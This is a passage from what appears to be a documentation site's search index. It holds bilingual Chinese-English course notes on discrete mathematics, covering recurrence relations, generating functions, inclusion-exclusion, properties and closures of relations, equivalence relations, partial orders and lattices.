R\\)</li> <li>\\(F(n)\\)\u00a0\u975e\u96f6\uff0c\u4e14\u53ea\u7531\\(n\\)\u51b3\u5b9a</li> </ul> </li> <li>Solve: \u627e\u7279\u89e3\u00a0\\(a_n^{(p)}\\)(Particular)\uff0c\u518d\u6c42\u4e0d\u542b\u00a0\\(F(n)\\)\u00a0\u7684\u9012\u63a8\u7684\u901a\u89e3\u00a0\\(a_n^{(h)}\\)\uff0c\u5219\u901a\u89e3\u4e3a\u00a0\\(a_n^{(p)} + a_n^{(h)}\\)<ul> <li>\u7279\u522b\u5730\uff0c\u5f53\u00a0\\(F(n)\\)\u00a0\u7684\u5f62\u5f0f\u662f\\((b_tn^t +b_{t-1}n^{t-1} +...+b_1n+ b_0)s^n,\\ b_i,s\\in R\\)<ul> <li>(Case 1) \\(s\\)\u4e0d\u4e3a\u7279\u5f81\u6839\uff0c\u5219\u7279\u89e3\u4e3a\u00a0\\((p_tn^t +p_{t-1}n^{t-1} +...+p_1n+ p_0)s^n\\)</li> <li>(Case 2) \\(s\\)\u4e3a\u7279\u5f81\u6839\u4e14\u91cd\u590d\u4e86\\(m\\)\u6b21\uff0c\u5219\u7279\u89e3\u4e3a\\(n^m (p_tn^t +p_{t-1}n^{t-1} +...+p_1n+ p_0)s^n\\)</li> </ul> </li> <li>\u6c42\u89e3\u7684\u65f6\u5019\u6ce8\u610f\u7279\u89e3\u7684\u5f62\u5f0f\uff1a\u53d6\u5230\u54ea\u4e2a\u5e42\u6b21</li> </ul> </li> </ul> <p>\u7279\u5f81\u6839\u4e3a3\u5e76\u4e14\u91cd\u590d\u4e86\u4e24\u6b21</p> <p></p> <p>\u7279\u5f81\u6839\u4e3a1...</p> <p></p> <p>\u6ce8\u610f\uff0c\u53ef\u4ee5\u5c06 \\(n\\) \u770b\u4f5c \\(n*1^n\\) \uff0c\u5219\\(s\\)\u53d61\uff0c\\(m\\)\u53d61\uff0c\\(n\\)\u8f6c\u6362\u6210\u4e00\u6b21\u7684\u4e00\u822c\u5f62\u5f0f\\(p_1n^2 +p_o\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#84-generating-functions","title":"8.4 Generating Functions","text":"<p>\u751f\u6210\u51fd\u6570\u7684\u672c\u8d28\u662f\u5904\u7406\u6392\u5217\u7ec4\u5408\u7684\u6709\u6548\u5de5\u5177\u3002</p> <ul> <li>Definition<ul> <li>For sequence\u00a0\\(a_0, a_1, a_2, ...,a_k,...\\)\uff0cits generating function is:\u00a0\\(G(x)=a_o +a_1x+ ...+a_kx^k+ ...=\\sum_{i=0}^{\\infty} a_kx^k\\)</li> <li>eg: \\(1+x+...+x^k= \\sum_{k=0}^\\infty x^k =\\frac{1}{1-x},|x|&lt;1\\)</li> </ul> </li> </ul> <p></p> <ul> <li>\u91cd\u8981\u7b49\u5f0f<ul> <li>\u82e5\\(b_k= \\sum_{i=0}^k a_i\\ \\ a_k\\leftrightarrow G(x)\\ \\ b_k\\leftrightarrow F(x)\\)\uff0c\u5219\\(F(x)=\\frac{G(x)}{{1-x}}\\)</li> <li>\\(C_{-n}^k =(-1)^k C_{n+k-1}^k\\)</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#counting-with-generating-functions","title":"Counting with Generating Functions","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter8/#r-combinations-from-a-set-with-n-elements-with-repetitions-allowed","title":"r-combinations from a set with n elements with repetitions allowed","text":"<p>\u5728term\u4e2d\uff0c\\(x^i\\)\u4ee3\u8868\u8fd9\u4e2a\u5143\u7d20\u6709\u88ab\u9009\u4e86i\u6b21\uff0c\u5171\u6709n\u4e2a\u5143\u7d20\uff0c\u56e0\u6b64\u6211\u4eec: \\(G(x)=(1+x+x^2 +x^3+... )^n= (\\frac{1}{{1-x}})^n =\\sum_{k=0}^\\infty C_{n+k-1}^k x^k\\) \u5176\u4e2d\u6211\u4eec\u8981\u627e\u7684\u7b54\u6848\u5c31\u662f\\(x^r\\)\u7684\u7cfb\u6570\\(C_{n+r-1}^r\\)</p> <p>Example Find the number of solutions of \\(e_1+ e_2+ e_3 =17\\ \\ where\\ 2\\le e_1\\le 5,3\\le e_2\\le 6,4\\le e_3\\le 7\\)</p> \\[G(x)=(x^2+ x^3 +x^4+ x^5)( x^3 +x^4+ x^5+ x^6)( x^4+ x^5 +x^6+ x^7)\\] <p>\u7b54\u6848\u5c31\u662f\\(x^{17}\\)\u7684\u7cfb\u6570\u3002</p> \u5982\u4f55\u5feb\u901f\u6c42\u7cfb\u6570? <p>\u5728\u8fd9\u91cc\u6211\u4eec\u4ee5\\(G(x)=(1+x+...+x^{2r} )^3\\)\u6c42\\(x^{3r}\\)\u7684\u7cfb\u6570\u4e3a\u4f8b:</p> <p>\\(G(x)=(\\frac{1-x^{2r+1}}{1-x})^3 =\\frac{1-3x^{2r+1}+ 3x^{4r+2}- x^{6r+3}}{(1-x)^3}\\)</p> <p>\u4ee4\\(F(x)=\\frac{1}{(1-x)^3}=\\sum C_{i+2}^{i} x^i\\)\uff0c\u56e0\u4e3a\\(G(x)=({1-3x^{2r+1}+ 3x^{4r+2}- x^{6r+3}})F(x)\\)\u53ea\u9700\u8981\u627e\u5230i=3r\u548ci=r-1(2r+1+i=3r)\u7684\u60c5\u51b5\u5373\u53ef</p> <p>\u56e0\u6b64\uff0c\\(a^{3r}=C_{3r+2} ^{3r}-3C_{r+1} ^{r-1}\\)</p> <p>\u5229\u7528Generating Function\u6c42Recurrence Relations</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#85-inclusion-exclusion","title":"8.5 Inclusion-Exclusion","text":"<p>For the Union of n finite sets\uff1a</p> \\[ |A_1 \\cup A_2\\cup ...\\cup A_n|= \\sum_{i=1}^{n} |A_i| -\\sum_{1\\le i\\lt j\\le n}|A_i\\cap A_j|+ \\sum_{1\\le i\\lt j\\lt k\\le n}| A_i \\cap A_j\\cap A_k|+...+(-1)^{n+1}|A_1 \\cap A_2\\cap ...\\cap A_n| \\] <p>\u8bc1\u660e</p> <p>\u5047\u8bbe\u5171\u6709r\u4e2a\u96c6\u5408\u5305\u542b\u5143\u7d20a\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5143\u7d20\u88abcount\u7684\u4e2a\u6570\u6709\u7b49\u5f0f\uff1a</p> \\[ 1=C_r^1 -C_r^2+ C_r^3 -...+(-1)^r C_r^r\\ \\ [Since\\ (1-1)^r=0] \\] <p>\u5176\u4e2d\u7b49\u5f0f\u5de6\u8fb9\u76841\u4e0e\\(|A_1 \\cup A_2\\cup ...\\cup A_n|\\)\u5bf9\u5e94</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter8/#86-application-of-inclusion-exclusion","title":"8.6 Application of Inclusion-Exclusion","text":"<p>\u4ee5 \\(N(P_i)\\) \u8868\u793a\u6ee1\u8db3 \\(P_i\\) \u7684\u4e2a\u6570\uff0c\u5219\u6709 $$ N(P_1' P_2'... P_n')=N- |A_1 \\cup A_2\\cup ...\\cup A_n|=N- \\sum_{1\\le i\\le n} N(P_i)+\\sum_{1\\le i\\lt j\\le n} N(P_i P_j)-...+(-1)^nN( P_1 P_2...P_n) $$</p> <p>\u4f8b\u98981 \u5c06\u9694\u677f\u539f\u7406\u9898\u76ee\u5316\u7b80</p> <p></p> <p>\u4f8b\u98982 onto functions\u7684\u4e2a\u6570</p> <p></p> <p>\u4f8b\u98983 derangement \u6253\u4e71\u6b21\u5e8f\uff0c\u4e14\u6bcf\u4e2a\u5143\u7d20\u4e0d\u5728\u539f\u6765\u4f4d\u7f6e</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/","title":"CH 9. Relations","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter9/#ch-9-relations","title":"CH 9 : Relations","text":"<p> \u7ea6 2269 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#91-relations-and-their-properties","title":"9.1 Relations and Their Properties","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter9/#_1","title":"\u5b9a\u4e49","text":"<p>A binary relation(\u4e8c\u5143\u5173\u7cfb) R from set \\(A\\) to set \\(B\\) is a subset of \\(A\\times B\\)</p> <p>Note</p> <p>A binary relation R is a set</p> <p>\\(R\\subseteq A\\times B\\)</p> <p>\\(R=\\{(a,b)|a\\in A ,b\\in B ,aRb\\}\\)</p> <p>Functions As Relations</p> <p>The graph of function \u662f\u4eceA\u5230B\u7684\u4e00\u4e2arelation\uff0c\u4f46\u662frelation\u4e0d\u4e00\u5b9a\u662ffunction\uff0c\u56e0\u4e3a\u4e00\u4e2ax\u53ef\u80fd\u5bf9\u5e94\u591a\u4e2ay</p> <p>A relation of set A is a relation from A to A.</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#_2","title":"\u8868\u793a\u65b9\u5f0f","text":"<ul> <li>list its all ordered pairs \u5217\u4e3e\u6240\u6709pairs</li> <li>using a set build notation/specification by predicates \u5229\u7528\u6761\u4ef6\u8bed\u53e5\u7684set</li> <li>2D Table</li> <li>Connection Matrix / Zero-one Matrix</li> <li>Digraph</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#2d-table","title":"2D Table","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter9/#connection-matrices","title":"Connection Matrices","text":"<p>\u56e0\u6b64\uff0cbinary relations on a set A with n elements \u5171\u6709\\(2^{n^2}\\)\u4e2a</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#digraph","title":"Digraph","text":"<p>Example</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#special-properties-of-binary-relations","title":"Special Properties of Binary Relations","text":"<ul> <li>Reflexive \u81ea\u53cd\u6027</li> <li>Irreflexive \u53cd\u81ea\u53cd\u6027</li> <li>Symmetric \u5bf9\u79f0\u6027</li> <li>Antisymmetric \u53cd\u5bf9\u79f0\u6027</li> <li>Transitive \u4f20\u9012\u6027</li> </ul> <p>\u3010Definition\u3011 A relation R on a set A is reflexive if</p> \\[ \\forall x(x\\in A\\to (x,x)\\in R) \\] <p>\u5373\u5bf9\u4e8e\u4efb\u610f \\(A\\) \u4e2d\u5143\u7d20\uff0c\\((x,x)\\) \u90fd\u5728 \\(R\\) \u4e2d\u3002</p> <p>\u56e0\u6b64\uff0c\u82e5\u7528\u77e9\u9635\u8868\u793a\uff0c\u77e9\u9635\u6b63\u5bf9\u89d2\u7ebf\u5e94\u5f53\u5168\u90e8\u4e3a1\uff1b\u82e5\u7528\u6709\u5411\u56fe\u8868\u793a\uff0c\u6bcf\u4e2avertex\u90fd\u5e94\u8be5\u6709\u4e2aloop\u6307\u5411\u81ea\u5df1\u3002</p> <p>\u81ea\u53cd\u5173\u7cfb\u4e2a\u6570\u4e3a \\(2^{n ^2-n}\\)</p> <p>\u3010Definition\u3011 A relation R on a set A is irreflexive if</p> \\[ \\forall x(x\\in A \\to (x,x)\\notin R) \\] <p>\u5bf9\u4e8e\u4efb\u610f \\(A\\) \u4e2d\u5143\u7d20\uff0c\\((x,x)\\) \u90fd\u4e0d\u5728 \\(R\\) \u4e2d\u3002</p> <p>\u56e0\u6b64\uff0c\u82e5\u7528\u77e9\u9635\u8868\u793a\uff0c\u77e9\u9635\u6b63\u5bf9\u89d2\u7ebf\u5e94\u5f53\u5168\u90e8\u4e3a0\uff1b</p> \u5b58\u5728relation\u65e2\u4e0d\u662freflexive\u4e5f\u4e0d\u662firreflexive <p></p> <p>\u53cd\u81ea\u53cd\u5173\u7cfb\u4e2a\u6570\u4e3a\\(2^{ n^2-n}\\)</p> <p>\u56e0\u6b64\u65e2\u4e0d\u662f\u81ea\u53cd\uff0c\u4e5f\u4e0d\u662f\u53cd\u81ea\u53cd\u7684 relation \u5171\u6709\\(2^{n ^2} - 2*2^{ n^2-n}\\) \u4e2a</p> <p>\u3010Definition\u3011 A relation R on a set A is symmetric if</p> \\[ \\forall x\\forall y((x,y)\\in R\\to(y,x)\\in R) \\] <p>\u7528\u77e9\u9635\u8868\u793a\uff0c\u5219\u77e9\u9635\u5173\u4e8e\u5bf9\u89d2\u7ebf\u5bf9\u79f0\u3002</p> <p>\u5bf9\u79f0\u5173\u7cfb\u7684\u4e2a\u6570\u4e3a\\(2^n \\cdot 2^{\\frac{ n^2-n}{2}} = 2^{\\frac{ n^2+n}{2}}\\)</p> <p>\u3010Definition\u3011 A relation R on a set A is antisymmetric if</p> \\[ \\forall x\\forall y((x,y)\\in R \\land (y,x)\\in R \\to x=y) \\] <p>\u6ce8\u610f\uff0c\u53ea\u662f\u5173\u4e8e\u5bf9\u89d2\u7ebf\u4e0d\u5b58\u5728\u4e24\u4e2a\u90fd\u4e3a 1 \u7684\u60c5\u51b5\uff0c\\((0,1)\\) \u662f\u5141\u8bb8\u7684</p> <p>\u56e0\u6b64\uff0c\u4e5f\u53ef\u4ee5\u8fd9\u6837\u8868\u793a\u5173\u7cfb:</p> \\[ \\forall x\\forall y((x,y)\\in R\\land x\\ne y\\to (y,x)\\notin R) \\] <p></p> <p>\u53cd\u5bf9\u79f0\u5173\u7cfb\u7684\u4e2a\u6570\u4e3a \\(2^ n\\cdot 3^{\\frac{ n^2-n}{2}}\\)</p> <p>\u3010Definition\u3011 A relation R on a set A is transitive if</p> \\[ \\forall x\\forall y\\forall z((x,y)\\in R\\land (y,z)\\in R\\to (x,z)\\in R) \\] <p>\u7528 \\(m_{ij}\\) \u8868\u793a\u77e9\u9635\u7b2c i \u884c\u7b2c j \u5217\u7684\u503c\uff0c\u5219\u6709 \\(\\overline{m_{ij}\\land m_{jk}}\\lor m_{ik}=1\\)</p> <p>\u5224\u522b\u7279\u5f81\u7684\u4f8b\u5b50</p> <p> </p> <p>\u7531symmetric\u548ctransitve\u4e0d\u80fd\u63a8\u5bfc\u51fareflexive</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#combining-relations","title":"Combining Relations","text":"<ul> <li>Set operation</li> <li>Composition</li> <li>Inverse relation</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#set-operation","title":"Set operation","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter9/#composition","title":"Composition","text":"<p>\u6ce8\u610f\uff0cR\u662f\u524d\u9762\u90a3\u4e2a</p> <p></p> <p>\u5229\u7528\u77e9\u9635\u4e58\u6cd5\u53ef\u4ee5\u6c42Composition</p> <p></p> <p>\u5229\u7528\u6709\u5411\u56fe\u6c42Composition</p> <p></p> <p>Definition Let R be a relation on the set A. The powers \\(R^n,n=1,2,3,...\\)  are defined recursively by</p> \\[ R^1 =R,and\\ R^{n+1}= R^n\\circ R \\] <p>Theorem The relation R on a set A is transitive if and only if \\(R^n\\subseteq R,for \\ n=1,2,3,...\\)</p> <p>\u5bf9\u79f0\u5173\u7cfb\u7684n\u6b21\u65b9\u8fd8\u662f\u5bf9\u79f0\u7684</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#inverse-relation","title":"Inverse relation","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter9/#94-closures-of-relations","title":"9.4 Closures of Relations","text":"<ul> <li>Reflexive Closure</li> <li>Symmetric Closure</li> <li>Transitive Closure</li> </ul> <p>Definition The closure of relaitons R with respect to property P is the relation S with respect to property P containing R such that S is a subset of every relation with property P containing R.</p> <p>\u5173\u7cfbR\u5173\u4e8e\u6027\u8d28P\u7684\u95ed\u73af\uff0c\u5c31\u662f\u4e00\u4e2a\u5177\u6709\u6027\u8d28P\u4e14\u5305\u542bR\u7684\u6700\u5c0f\u5173\u7cfbS\u3002</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#reflexive-closure","title":"Reflexive Closure","text":"<p>Theorem  Let R be a relation on A . The reflexive closure of R , denoted by \\(r(R)\\) , is  \\(R\\cup I_A\\ \\ I_A=\\{(x,x)|x\\in A\\}\\)</p> <p>\u8bc1\u660e\u9700\u8981\u8bc1\u660eClosure\u7684\u4e09\u4e2a\u6027\u8d28</p> <ol> <li>\u5305\u542bR  2. \u662fReflexive\u7684\u5173\u7cfb 3. \u662f\u5305\u542bR\u7684\u6700\u5c0fReflexive\u5173\u7cfb </li> </ol> <ul> <li>\u7528\u96c6\u5408\u8868\u793a\u7684\u8bdd\uff0c\u5c31\u662f\u5f80R\u91cc\u9762\u52a0\u5165\u6240\u6709\u4e0d\u5728R\u5185\u7684\\((a,a)\\ where\\ a\\in A\\)</li> <li>\u7528\u6709\u5411\u56fe\u8868\u793a\u7684\u8bdd\uff0c\u5219\u662f\u7ed9\u6bcf\u4e00\u4e2aVertex\u6dfb\u52a0loop</li> <li>\u7528connection matrix\u8868\u793a\u5219\u5728\u4e3b\u5bf9\u89d2\u7ebf\u4e0a\u5168\u7f6e1</li> </ul> <p>Example</p> <p>Question\uff1a \\(R=\\{(a,b)|a&lt;b,a,b\\in Z\\}\\) what is \\(r(R)\\)?</p> <p>\\(r(R)=R\\cup I_A =\\{(a,b)|a&lt;b,a,b\\in Z\\} \\cup \\{(a,a)|a\\in Z\\}\\)</p> <p>\\(=\\{(a,b)|a\\le b,a,b\\in Z\\}\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#symmetric-closure","title":"Symmetric Closure","text":"<p>Theorem  Let R be a relation on A . The symmetric closure of R , denoted by \\(s(R)\\) , is \\(R\\cup R^{-1}\\)</p> <p>\u8bc1\u660e\u9700\u8981\u8bc1\u660eClosure\u7684\u4e09\u4e2a\u6027\u8d28</p> <ol> <li>\u5305\u542bR  2. \u662fSymmetric\u7684\u5173\u7cfb 3. \u662f\u5305\u542bR\u7684\u6700\u5c0fSymmetric\u5173\u7cfb  </li> </ol> <ul> <li>\u7528\u96c6\u5408\u8868\u793a\u7684\u8bdd\uff0c\u5982\u679c\\((a,b)\\)\u5728R\u5185\u4e14\\((b,a)\\)\u4e0d\u5728R\u5185\uff0c\u5219\u52a0\u4e0a</li> <li>\u7528\u6709\u5411\u56fe\u8868\u793a\u7684\u8bdd\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2aedge\u4ece y \u5230 x\uff0c\u518d\u52a0\u4e0a\u4e00\u4e2a\u4ece x \u5230 y \u7684edge</li> <li>\u7528connection matrix\u8868\u793a\u5219  \\(M_{s(R)} =M_R \\lor M_R^T\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#transitive-closure","title":"Transitive Closure","text":"<p>\u5148\u5bfc\u77e5\u8bc6:</p> <ul> <li>\u6709\u5411\u56fe\u4e2d\u4e00\u6bb5\u957f\u5ea6\u4e3an\u7684path\u53ef\u4ee5\u7528sequence\u8868\u793a:\\((x_0 ,x_1),( x_1, x_2),...,(x_{n-1} ,x_{n})\\)<ul> <li>\u4e5f\u53ef\u4ee5\u7b80\u5199\u6210 \\(x_0 ,x_1 ,x_2 ,...,x_{n-1} ,x_{n}\\)</li> </ul> </li> <li>\u5982\u679c \\(x_0= x_n\\ (n\\ge 1)\\)\uff0c\u5219\u79f0\u8fd9\u6761path\u4e3a Cycle \u6216\u8005 Circuit <ul> <li>\\(|A|=n\\Rightarrow Any\\ path\\ of\\ length\\ &gt;n\\ must\\ contain\\ a\\ cycle\\)</li> </ul> </li> </ul> <p>Theorem Let R be a relation on A . There is a path of length n from a to b if and only if \\((a,b)\\in R^n\\)</p> <p>\u53ef\u4ee5\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\uff1a \\((a,x)\\in R\\ ,\\ (x,b)\\in R^{n-1} \\Rightarrow (a,b)\\in R^{n}\\)</p> <p>Definition The connectivity relation denoted by \\(R^*\\) , is the set of ordered pairs (a,b) such that there is a path (in R) from a to b : \\(R^* =\\bigcup_{n=1}^{\\infty} R^n\\) and \\(t(R)=R^*\\)</p> <p>Corollary If \\(|A|=n\\) , then \\(t(R)=R^* =R\\cup R^2\\cup ...\\cup R^n\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#95-equivalence-relations","title":"9.5 Equivalence Relations","text":"<p>Definition A relation R on a set A is an equivalence relation if R is :</p> <ul> <li>reflexive</li> <li>symmetric</li> <li>transitive</li> </ul> <p>\u7b49\u4ef7\u5173\u7cfb\u4f8b\u5b50</p> <p>(1) \\(\\{(a,b)|a+b=2m,a,b,m\\in N\\}\\)</p> <p>(2) The similarity relation between two triangles</p> <p>(3) The equvalent relation between two fomulas in proposition logic</p> <p>If R is an equvalence relations and (a,b) in R , then we note that <code>a~b</code> ,which means a and b is equvalent .</p> <p>Definition  The set of all elements that are related to an element x of A is called the equivalent class of x (\u7b49\u4ef7\u7c7b)</p> <p>Notation : \\([x]_R\\ \\ [x]\\)</p> <p>Example</p> <p></p> <p></p> <p>Theorem \u5bf9\u4e8e\u7b49\u4ef7\u5173\u7cfb R \uff0c\u4ee5\u4e0bstatements\u662f\u7b49\u4ef7\u7684\uff1a</p> <ol> <li>\\(a R b\\)</li> <li>\\([a]=[b]\\)</li> <li>\\([a]\\cap [b]\\ne \\emptyset\\)</li> </ol> <p>Definition A partition of set A is a collection of disjoint nonempty  subsets of A that have A as their union</p> <ul> <li>\\(A_i \\ne \\emptyset \\ \\ for\\ i\\in I(I\\ is\\ an\\ index\\ set)\\)</li> <li>\\(A_i \\cap A_j=\\emptyset,when\\ i\\ne j\\)</li> <li>\\(\\bigcup _{i\\in I} A_i =A\\)</li> </ul> <p>Notation: \\(pr(A)=\\{A_i|i\\in I\\}\\)</p> <p>\u96c6\u5408\u7684\u5212\u5206\u548c\u7b49\u4ef7\u7c7b\u4e00\u4e00\u5bf9\u5e94</p> <p>Example</p> <p></p> <p>\u5982\u4f55\u8ba1\u7b97\u7b49\u4ef7\u5173\u7cfb\u7684\u6700\u5927\u4e2a\u6570\uff1f</p> <ul> <li>n\u5143\u96c6\u5408\u7684\u7b49\u4ef7\u7c7b\u7684\u4e2a\u6570 \\(B_{n+1} =\\sum _{k=0}^n C_n ^k B_k,where\\ B_0= B_1=1,B_2=2\\)</li> <li>\u53ef\u4ee5\u5229\u7528\u7c7b\u5e15\u65af\u5361\u4e09\u89d2\u5f62\u624b\u7b97<ul> <li>\u5c061\u653e\u5728\u7b2c\u4e00\u4e2a\u4f4d\u7f6e</li> <li>\u6bcf\u884c\u4e09\u89d2\u5f62\u4e2d\u6700\u5de6\u8fb9\u7684\u503c\u901a\u8fc7\u590d\u5236\u4e0a\u4e00\u884c\u4e2d\u6700\u53f3\u8fb9\u7684\u503c\u3002\u6bcf\u884c\u4e2d\u7684\u5176\u4f59\u4f4d\u7f6e\u662f\u5de6\u4fa7\u548c\u5de6\u4e0a\u65b9\u4f4d\u7f6e\u7684\u4e24\u4e2a\u503c\u4e4b\u548c <pre><code>1  -B1\n1    2  -B2\n2    3    5  -B3\n5    7    10   15  -B4\n15   20   27   37   52  -B5\n52   67   87   114  151  203  -B6\n</code></pre></li> </ul> </li> </ul> <p>Example</p> <p></p> <p>Properties</p> <p>\\(R_1\\)\u548c\\(R_2\\)\u662f\u96c6\u5408A\u4e0a\u4e24\u4e2a\u7b49\u4ef7\u5173\u7cfb\uff0c\u5219\uff1a</p> <ul> <li>\\(R_1\\cap R_2\\) is equvalence relation on A</li> <li>\\(R_1\\cup R_2\\) is reflexive and symmetric relation on A</li> <li>\\(\\overline{R_1\\cup R_2}\\) is equvalence relation on A</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#96-partial-ordering","title":"9.6 Partial Ordering","text":"<p>Definition A relation R on a set S is partial ordering or partial order if R is :</p> <ul> <li>reflexive</li> <li>antisymmetric</li> <li>transitive</li> </ul> <p>Notation: (S,R) --- partial ordered set or poset , \\(a\\preceq b\\)  --- \\((a,b)\\in R\\)</p> <p>Info</p> <p>\\(\\preceq\\) precede or equal to  \u5148\u4e8e\u6216\u7b49\u4e8e \u7528latex\u6253\u5373 \\preceq </p> <p>Example</p> <p></p> <p>\u5982\u4f55\u8ba1\u7b97\u504f\u5e8f\u5173\u7cfb\u7684\u6700\u5927\u4e2a\u6570\uff1f</p> <ul> <li>\u753b\u6210Hasse Diagrams\u56fe\u8fdb\u884c\u5206\u7c7b\u8ba1\u7b97<ul> <li>\u6309\u7167\u5c42\u6570\u4e0d\u540c\u8fdb\u884c\u5206\u7c7b</li> <li>\u5982\uff0c\u4e00\u4e2a\u542b\u6709\u4e09\u4e2a\u5143\u7d20\u7684\u96c6\u5408\uff0c\u6700\u591a\u542b\u6709 19 \u4e2a\u504f\u5e8f\u5173\u7cfb</li> </ul> </li> </ul> <p></p> <p>Definition </p> <ul> <li>Comparable:<ul> <li>\\(a,b\\ of\\ (S,\\preceq),a\\preceq b\\ or\\ b\\preceq a\\)</li> </ul> </li> <li>Incomparable:<ul> <li>\\(a,b\\ of\\ (S,\\preceq),neither\\ a\\preceq b\\ nor\\ b\\preceq a\\)</li> </ul> </li> </ul> <p>\u5982\u679cSet S\u4e2d\u4efb\u610f\u4e24\u4e2a\u5143\u7d20\u90fdComparable\uff0c\u90a3\u4e48\u79f0 \\(\\preceq\\) \u662f totally ordered (\u5168\u5e8f) or  linearly ordered set .\u4e14 \\((S,\\preceq)\\) \u88ab\u79f0\u4e3a chain</p> <p>Example</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#lexicographic-order","title":"Lexicographic Order \u5b57\u5178\u5e8f","text":"<p>\u5bfc\u6f14\u526a\u8f91\u7248</p> <p>\u5c06\u5143\u7d20\u770b\u4f5c\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u5355\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5927\u5c0f\u6bd4\u7684\u662f\\preceq</p> <p></p> <p>Theorem A lexicographic ordering on the Cartesian product of two posets is a partial ordering.</p> <p>\u4e24\u4e2aposets\u7684\u53c9\u4e58\u7684\u5b57\u5178\u5e8f\u8fd8\u662fposets</p> <p>\u5b57\u5178\u5e8f\u4f8b\u5b50</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u5ef6\u7533\u4e3a\u591a\u4e2aposets\u7684\u7b1b\u5361\u5c14\u79ef(Cartesian Products)</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#hasse-diagrams","title":"Hasse Diagrams \u54c8\u65af\u56fe","text":"<p>A method used to represent a partial ordering</p> How to obtain a Hasse Diagrams <ul> <li>\\(A\\ =\\ \\{1,2,3,4,5,6,7,8,9\\},R\\ =\\ \\{(a,b)|\\ a|b,a,b\\in A\\}\\)</li> </ul> <p>1.\u7528\u6709\u5411\u56fe\u8868\u793a\u6240\u6709\u5173\u7cfb </p> <p>2.\u5220\u9664\u81ea\u73af </p> <p>3.\u5220\u9664\u53ef\u4ee5\u901a\u8fc7\u4f20\u9012\u6027\u5f97\u5230\u7684\u8fb9 </p> <p>4.\u8f6c\u4e3a\u65e0\u5411\u56fe </p> <p>More Example</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#chain-and-antichain","title":"Chain and Antichain","text":"<p>\u4e0d\u60f3\u5199\u4e86\uff0c\u76f4\u63a5\u628a\u5b66\u957f\u7684\u7b14\u8bb0\u622a\u56fe\u8fc7\u6765</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#maximal-and-minimal-elements","title":"Maximal and Minimal Elements \u6781\u5927\u503c\u548c\u6781\u5c0f\u503c","text":"<p>Definition Let \\((A,\\preceq)\\) be a poset . \\(a\\in A\\) , then a is a maximal element if there does not exist an element b in A such that \\(a\\prec b\\) .</p> <p></p> <p>Info</p> <p>\u6781\u5927\u503c\u548c\u6781\u5c0f\u503c\u5c31\u662fHasse Diagrams\u79cd\u6700\u4e0a\u9762\u4e00\u5c42\u548c\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u5143\u7d20</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#greatest-and-least-element","title":"Greatest and Least Element \u6700\u5927\u503c\u548c\u6700\u5c0f\u503c","text":"<p>Definition Let \\((A,\\preceq)\\) be a poset . \\(a\\in A\\) , then a is a greatest element if \\(b\\preceq a\\) for every b in A .</p> <p></p> <p>Info</p> <p>\u5982\u679c\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u5b58\u5728\uff0c\u5219\u662f\u552f\u4e00\u7684\u3002\u6ce8\u610f\uff0c\u6700\u5927\u503c\u8981\u6c42\u6240\u6709\u5176\u5b83\u5143\u7d20\u90fdpreceq\u5b83\uff0c\u5982\u4e0a\u56fe\uff082\uff09\u4e2d 6 \u548c 9 \u5c31\u4e0d preceq 8</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#upper-and-lower-bounds","title":"Upper and Lower Bounds \u4e0a\u4e0b\u754c","text":"<p>\u5728\u6b64\u57fa\u7840\u4e0a\u8fd8\u6709 Least upper bound (\u8bb0\u4e3alub(A))\u548c Greatest lower bound (\u8bb0\u4e3aglb(A))\uff0c\u5b57\u9762\u610f\u601d\u6307\u4e0a\u4e0b\u754c\u4e2d\u6700\u5927\u6216\u6700\u5c0f\u7684\u5143\u7d20</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#well-ordered-sets","title":"Well-ordered Sets \u826f\u5e8f\u96c6","text":"<p>Definition A poset(A,R) is well-ordered set if every nonempty subset of A has a least element .</p> <p>A well-ordered set is a totally ordered set \u826f\u5e8f\u5219\u5168\u5e8f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter9/#lattices","title":"Lattices \u683c","text":"<p>Definition \u4e00\u4e2aposet\u88ab\u79f0\u4e3alattices\u5982\u679c\u6bcf\u5bf9\u5143\u7d20\u90fd\u6709lub\u548cglb</p> <p>Info</p> <p></p>"},{"location":"Courses/Java/","title":"Java 